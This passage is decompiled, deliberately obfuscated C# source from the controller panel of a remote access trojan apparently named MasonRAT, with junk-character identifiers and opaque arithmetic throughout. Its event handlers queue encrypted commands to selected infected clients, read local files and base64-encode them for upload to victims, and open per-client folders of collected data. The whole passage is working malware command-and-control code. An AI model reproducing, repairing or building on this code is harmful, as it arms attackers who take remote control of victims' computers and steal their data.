      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609ٸــڅ\u0608ﻋ\u060Aطۭ̍ـ\u0608\u060Dڙ\u0609\u060F\u060B(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cۭ̍ؤءڙۡــڞٽ\u060F\u060Dۭـ\u060A\u060Aم(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count > 1)
    {
      int num1 = (int) MessageBox.Show(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1841));
    }
    else if (Operators.CompareString(this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Items[this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.FocusedItem.Index].SubItems[((-1768974895 ^ ~1685260608) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ (1536712960 + (1434449829 << 971687826) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) % ((1033300388 > 231504382 ? 757661082 : 1010214776) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0].Text, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1842), false) == 0)
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1843));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    else
    {
      int num2 = (int) MessageBox.Show(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1844));
    }
  }

  private void \u2694️MasonRAT\u270Cڠ\u060Bــــﻋۛۧ̍ٺ\u060D\u060F(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1845) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1846));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ۡـڙ\u0609ــڙ\u060Eـڙؤۜـ\u060Aڙ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1847) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1848));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cٺڠۙۨ\u0608ــ\u0609ﯧٺڙۙــ\u060Fـ̍ڦڙ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1849) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1850));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cڙب\u0608ټﻋ\u060D؁\u060Aۙڙــۏ\u060Aؤٻ\u060D\u060A\u060C(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      if (!Directory.Exists(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1851)))
        Directory.CreateDirectory(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1852));
      if (!Directory.Exists(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1853) + this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems[0].SubItems[(-1314915789 - -528356313 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ -(779525622 - -7033852 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0].Text))
        Directory.CreateDirectory(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1854) + this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems[0].SubItems[(1796601509 + -713185542 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + -(~1541342704 - 1670208626 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)].Text);
      System.Diagnostics.Process.Start(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1855) + this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems[0].SubItems[((1752782382 | 849946313) - 544786157 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - ((1261188847 - 1029082852 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) << (2078459404 + (242381944 << 2128752777) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1)].Text);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Fـءۭ\u060F\u060Dڅٸڙـ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1856));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Eـڙط\u0608ڝ\u0020\u060A\u060Dﯧ\u060Cـۧــ\u060Aــ\u060A\u060A(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1857));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cح\u060Fژـ\u060Bـ̨\u0608ۭ\u060A\u060Fـ\u0608ﮪڙـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    if (MessageBox.Show(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1858), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1859), (MessageBoxButtons) (((-380403793 ^ (1823422812 | 1525555397)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ ~(-1852329609 - 693368814 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1))) == (DialogResult) ((1682951687 > 905926942 ? -1123461986 : -1497949314) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + ((-1990875451 ^ ~878506578) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0))
    {
      try
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1860) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1861))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cـﻼۚ\u0020ټـڙد\u060F\u060Bﻻـۛ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    OpenFileDialog openFileDialog = new OpenFileDialog();
    if (openFileDialog.ShowDialog() == DialogResult.OK)
    {
      try
      {
        string[] strArray = new string[((992886131 > 860412714 ? 1153314744 : 1537752992) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ (332049556 | 1151232824) - 320913405 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 << (1363172783 + 371741521 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1862);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[((25 ^ 20) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ (8 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1863)));
        strArray[(-1708571493 - (667478920 | 1003662236) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 > ((545230980 ^ 890100662 << 1900806250) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) ? 1330648873 + ~1330648869 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 : 29820641 - 521866074 % 37849649 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[954208421 + (828306189 << 1870067591) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - ~((1843898258 > 981719135 ? 396781790 : 529042386) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName));
